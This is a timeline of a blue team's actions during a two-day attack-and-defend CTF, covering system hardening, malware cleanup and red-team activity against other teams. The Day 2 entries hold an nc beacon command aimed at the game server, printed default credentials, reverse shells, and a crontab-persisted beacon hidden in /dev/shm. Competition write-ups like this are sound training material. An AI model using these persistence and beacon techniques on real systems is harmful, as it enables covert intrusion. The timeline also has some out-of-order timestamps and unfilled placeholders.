# Team Action Timeline - PVJ CTF Game

## Overview
This timeline documents the actions taken by the Blue Team (B4FFL3G4P) during the PVJ CTF game, based on Discord communications, Slack communications, and forensic evidence. The team operated across multiple channels: Linux, Windows, Red Team, pfSense, and Slack coordination.

## Pre-Game Preparation (July 2025)

### Team Formation and Planning
**July 6, 2025** - **Team Meeting #1**
- First team meeting via Google Meet
- Team introductions and role assignments
- Discussion of game strategy and preparation

**July 13, 2025** - **Team Meeting #2**
- Slack huddle for 2 hours
- Detailed role distribution planning
- GitHub repository setup and sharing

**July 20-27, 2025** - **Final Preparations**
- Team member ezx injured (ankle break) and unable to attend
- Punch Stain appointed as surrogate captain
- Final role assignments and strategy confirmation

### Role Assignments (Finalized)
- **Network Analyst**: Oscar
- **pfSense**: Shawnlo / coldren
- **Windows Hardening**: Brittney
- **Linux Hardening**: outofmemory, Viktorn, coldren
- **DNS (Bind9)**: outofmemory
- **Red Teaming**: forgetfulelephant, b4k3ry, coldren, Viktorn

## Day 1 - August 4, 2025

### Morning (10:00 AM - 12:00 PM)
**8:00 AM** - **Team Setup**
- Team arrived at Tuscany Suites, table location: far left corner of Middle Ground
- VPN credentials distributed and tested
- Proxmox access established
- Discord server joined: https://discord.gg/pWcxf2HS

**10:31 AM** - **Initial Access**
- Default credentials provided:
  - Windows: Administrator/User with P@55w0rd1!
  - pfSense: root/admin with pfsense
  - Linux: icanhasaccess with P@55w0rd1!
- IP Prefix: 100.80.2.0/23
- Domain: B4FFL3G4P.bslv.prod.ctf

**10:36 AM** - **pfSense Team (Punch Stain)**
- Began analysis of pfSense configuration
- Identified suspicious cron jobs including `virusprot` and `adjkerntz`
- Found unauthorized SSH keys in admin account

**10:39 AM** - **pfSense Team (coldren)**
- Analyzed cron job commands for malicious activity
- Identified `virusprot` and `adjkerntz` as suspicious
- Noted ALL allow rule on WAN interface needing hardening

**10:44 AM** - **pfSense Team Discussion**
- Determined `adjkerntz` is legitimate FreeBSD time adjustment tool
- Identified `virusprot` as malicious and needing removal
- Found unauthorized SSH keys that needed removal

**12:00 PM** - **Windows Team (Punch Stain)**
- Discovered Windows 8 system with replaced Ease of Access tools
- Found malicious binaries replacing on-screen keyboard
- Gained terminal with top-level privileges

### Afternoon (12:00 PM - 6:00 PM)
**12:22 PM** - **Linux Team (Outofmemory)**
- Shared UAC dump from podctl0 via Wormhole
- Identified malicious SSH authorized key locations

**12:29 PM** - **Linux Team (Punch Stain)**
- Identified Linux hosts with malicious SSH keys
- Found malicious SSH authorized key locations

**12:33 PM** - **Linux Team (Outofmemory)**
- Checked sshd_config on podctl0 for backdoors
- Confirmed no backdoor in sshd_config

**12:44 PM** - **Red Team (Viktorn)**
- Requested subnet information from Anthony

**12:59 PM** - **Linux Team (coldren)**
- Removed authorized_keys from systems
- Found malicious SSH keys in user trudy's account
- Identified keys from GitHub users rpinz and luftegrof

**1:25 PM** - **Linux Team (Punch Stain)**
- Booted ns0 into single user mode
- Working on fixing shell access

**1:25 PM** - **Linux Team (Outofmemory)**
- Major updates to podctl0:
  - Removed contents of user trudy homedir
  - Started removing generic users from /etc/passwd
  - Updated /etc/group
  - Disabled icanhasaccess user
  - Created new team user b4ff3g4p with password access
  - Created backup account outofmemory
  - Planned to remove icanhasaccess entirely

**1:33 PM** - **Linux Team (coldren)**
- Removed all keys from orangehrm0
- Found multiple emergency backup keys in various user accounts

**1:44 PM** - **Linux Team (Uscar)**
- Locked down orangehrm0 to only accept team SSH keys
- Found suspicious processes running

**2:14 PM** - **Windows Team (TheGwar)**
- Attempted to fix Windows 8-2 system that was bricked

**2:24 PM** - **Linux Team (Outofmemory)**
- Added podctl0 to Ubuntu Pro
- Planned to register ns0 with Ubuntu Pro once Punch finished updates

**2:28 PM** - **Linux Team (coldren)**
- Confirmed receipt of updates

**2:35 PM** - **Red Team (Viktorn)**
- Requested subnet information from Anthony

**2:50 PM** - **Linux Team (Outofmemory)**
- Provided DNS record for win8-2: 100.80.2.162

**2:50 PM** - **Linux Team (coldren)**
- Found runtime error on mail0 when connecting to root
- Removed .python helper that was causing issues

**2:54 PM** - **Red Team (Outofmemory)**
- Shared copy of full zone file for targeting other teams' networks

**3:35 PM** - **Linux Team (Uscar)**
- Provided drupald IP: 100.80.2.137

**3:36 PM** - **Linux Team (Outofmemory)**
- Received hint from 3ndgam3 about using ssh user@host "/bin/sh"

**3:44 PM** - **Linux Team (Anthony)**
- Proposed workflow for cleaning up Linux boxes
- Requested team feedback on approach

**3:46 PM** - **Linux Team (Outofmemory)**
- Updated shell access procedures for boxes with "cake" shell
- Provided commands for minimal shell access

**3:55 PM** - **Linux Team (Uscar)**
- Discovered `/bin/bash --noprofile --norc` works for shell access
- Found way to launch bash without profile configurations

**4:10 PM** - **Linux Team (Outofmemory)**
- Updated shell access procedures with improved commands
- Added `-t` flag for better terminal handling

**4:12 PM** - **Linux Team (Uscar)**
- Discovered elevation method: `sudo -s bash --noprofile --norc`
- Successfully killed birthday process
- Got cookie puzzle working

**4:36 PM** - **Linux Team (Uscar)**
- Successfully solved cookie puzzle
- Set up puzzle for team access

**4:58 PM** - **Linux Team (Uscar)**
- Stuck on morse code challenge

**5:18 PM** - **Linux Team (coldren)**
- Provided forensics tool: `sudo lsof | grep ESTABLISHED`
- Recommended remediation involving killall, kill -9, and binary removal

**5:58 PM** - **Linux Team (Outofmemory)**
- Provided detailed remediation procedure:
  - `sudo lsof |grep ESTAB | less`
  - Find non-standard beacon names (e.g., .gcpconf)
  - `ps aux |grep .gcpconf`
  - Delete exploit and kill processes

**6:00 PM** - **Windows Team (TheGwar)**
- Successfully fixed Windows 8-2 system
- System no longer crashing

**6:00 PM** - **Windows Team (TheGwar)**
- Provided commands to fix Utilman.exe:
  - `takeown /f C:\Windows\System32\utilman.exe`
  - `icacls C:\Windows\System32\Utilman.exe /grant administrators:F`
  - `ren C:\Windows\System32\utilman.exe utilman.bak`

**6:00 PM** - **Grey Team Service Request**
- Received urgent request from Greywater Beverages advertising team
- Users needing access: ijackson, dhernande, asmith, egonzalez, wking
- Team responded with maintenance update and system restoration

**6:00 PM** - **AD Account Provisioning**
- Provisioned Active Directory accounts for Grey Team users
- Earned 69 points for successful account provisioning
- Provided access instructions for Windows desktops
- Completed user account setup for advertising team members

**6:00 PM - 8:00 PM** - **Additional Day 1 Activities**
- [Additional activities to be added based on team communications]
- [Other point-earning activities completed]
- [Further system hardening and monitoring setup]

## Day 2 - August 5, 2025

### Morning (9:00 AM - 12:00 PM)
**9:33 AM** - **pfSense Team (Punch Stain)**
- Shared updated pfSense configuration

**10:03 AM** - **Grey Team Bidding**
- Received notification about dropping bids
- Team began monitoring for RFP opportunities

**9:46 AM** - **Windows Team (br_ttney)**
- Started hardening script on Windows 10-2
- Using GitHub script: simeononsecurity/Windows-Optimize-Harden-Debloat

**9:54 AM** - **Windows Team (br_ttney)**
- Reset password on Windows 10-3
- Restarting 10-2 to apply security settings
- Started secure script on 10-3

**10:02 AM** - **Windows Team (br_ttney)**
- Started Windows 12
- Reset password on Windows 12

**10:35 AM** - **Red Team (Anthony)**
- Announced beacon server token: 999c80c3-f424-4e75-91b1-7a63272cdc80
- Provided beacon server details:
  - Beacon: 100.80.0.144
  - CLI: 100.80.0.145
  - Server listening on TCP 50007

**10:35 AM** - **Red Team (coldren)**
- Found BT2 mediawiki open: 100.80.4.145
- Found BT3 linux3 open: 100.80.7.13

**10:38 AM** - **Red Team (coldren)**
- Found BT4 podwrk1 open: 100.80.9.52

**10:55 AM** - **Red Team (Punch Stain)**
- Provided team token: c0a97553-c1a7-4784-a8de-3b5f06bf03dc

**11:03 AM** - **Red Team (Anthony)**
- Provided beacon submission command:
  - `echo "c0a97553-c1a7-4784-a8de-3b5f06bf03dc" | nc 100.80.0.144 10443`

**11:04 AM** - **Red Team (Uscar)**
- Identified SSH access to BT3: olivia.white@100.80.7.13

**11:07 AM** - **Red Team (Uscar)**
- Asked about flag submission process

**11:25 AM** - **Red Team (Anthony)**
- Provided flag submission command for enemy boxes

**11:26 AM** - **Red Team (Uscar)**
- Planned to hide beacon with one-liner in /dev/shm/.job
- Created persistent beacon script with crontab

**11:44 AM** - **Red Team (coldren)**
- Found new host opened on BT2: redis0 (100.80.4.166)

**11:45 AM** - **Red Team (Anthony)**
- Asked about user for redis0

**11:47 AM** - **Red Team (coldren)**
- Found BT3 ns1 (100.80.6.133) accessible
- Used credentials: icanhassaccesswith P@55w0rd1!

**11:49 AM** - **Red Team (Uscar)**
- Identified SSH access through keys for oscar.harris@100.80.4.166
- Noted BT3 redis should beacon to team

**11:54 AM** - **Red Team (Anthony)**
- Shared game URL: http://100.80.0.134:8080/game/7/

**12:04 PM** - **Red Team (Anthony)**
- Provided IP 100.80.6.153 to Viktorn

**12:08 AM** - **Linux Team (coldren)**
- Suggested standardizing admin user as "rooster"

**12:11 AM** - **Linux Team (Outofmemory)**
- Shared current DNS zone file
- Provided B4FFL3G4P.bslv.prod.ctf.db

**12:12 PM** - **Red Team (coldren)**
- Provided one-liner to delete all users
- Created inventory file of Linux hosts

**12:39 PM** - **Linux Team (coldren)**
- Noted /dev/shm for memory-only malware execution

**1:07 PM** - **Linux Team (coldren)**
- Updated hosts list

### Afternoon (12:00 PM - 6:00 PM)
**12:01 PM** - **Windows Team (br_ttney)**
- Back in DC (Domain Controller)

**12:38 PM** - **Windows Team (coldren)**
- Provided Wazuh agent installation for Windows
- Shared installation commands and service start procedures

**1:46 PM** - **Windows Team (br_ttney)**
- Shared Wazuh console access via Wormhole
- Provided console URL: https://1c3e5t0pfi0m.cloud.wazuh.com/app/login

**1:57 PM** - **Red Team (coldren)**
- Confirmed BT2 redis0 still accessible

**2:01 PM** - **Red Team (Uscar)**
- Noted previous work was already completed

**3:03 PM** - **Red Team (B4k3rY)**
- Got reverse shell on 100.80.8.157
- Started beacon

**4:17 PM** - **Red Team (Punch Stain)**
- Created persistent beacon script with 5-minute intervals

**4:29 PM** - **Red Team (coldren)**
- Executed script on alice.smith@100.80.4.139

**4:42 PM** - **Red Team (Uscar)**
- Suggested trying "QuickAndDirty" throughout 100.80.4.0/23

**5:18 PM** - **Linux Team (coldren)**
- Requested Windows team to patch SMB vulnerability
- Shared vulnerability details for SMB signing not required

**5:59 PM** - **Grey Team Project Completion**
- Successfully completed Wazuh XDR deployment project
- Earned 30,000 JoeCoin for project completion
- Deployed agents on all supported hosts
- Created custom Windows and Linux policies

## Key Achievements

### Defensive Actions
1. **Linux Systems Hardening**
   - Removed malicious SSH keys from multiple systems
   - Disabled default user accounts (icanhasaccess)
   - Created secure team accounts with proper access controls
   - Implemented Ubuntu Pro on critical systems

2. **Windows Systems Hardening**
   - Applied security hardening scripts
   - Fixed compromised Ease of Access tools
   - Reset passwords on multiple systems
   - Installed Wazuh agents for monitoring

3. **pfSense Security**
   - Identified and removed malicious cron jobs
   - Secured SSH access with team keys only
   - Analyzed configuration for vulnerabilities

4. **Monitoring Implementation**
   - Deployed Wazuh agents across systems
   - Established centralized logging
   - Created forensics procedures

### Offensive Actions
1. **Network Reconnaissance**
   - Mapped other teams' networks
   - Identified vulnerable systems on other teams
   - Found default credentials on multiple systems

2. **Persistent Access**
   - Established reverse shells on enemy systems
   - Created persistent beacon scripts
   - Implemented automated flag submission

3. **Exploitation**
   - Successfully accessed multiple enemy systems
   - Used SSH key-based access where available
   - Exploited default credentials

### Business Operations
1. **Grey Team Service Management**
   - Successfully handled urgent service requests
   - Completed Wazuh XDR deployment project
   - Earned 30,069 JoeCoin through project completion
   - Maintained professional IT service relationships

2. **Project Management**
   - Responded to RFP opportunities
   - Managed bidding processes
   - Delivered on-time project completions


## Tools and Techniques Used
- **Wormhole**: Secure file sharing for evidence and tools
- **SSH Key Management**: Secure access control
- **Wazuh**: Centralized monitoring and logging
- **Forensics Tools**: Process analysis and network monitoring
- **Automation Scripts**: Persistent access and monitoring
- **Slack/Discord**: Multi-channel communication and coordination
- **GitHub**: Repository management and tool sharing
- **Proxmox**: Virtual environment management
- **UAC**: Unix Artifact Collector
- **Runzero**: Threat Landscape detection, Visibility
- **temp.sh**: File transfer tool
- **WireShark**: PCAP Analysis tool

This timeline demonstrates a well-coordinated team effort with clear separation of responsibilities across different system types and operational phases.
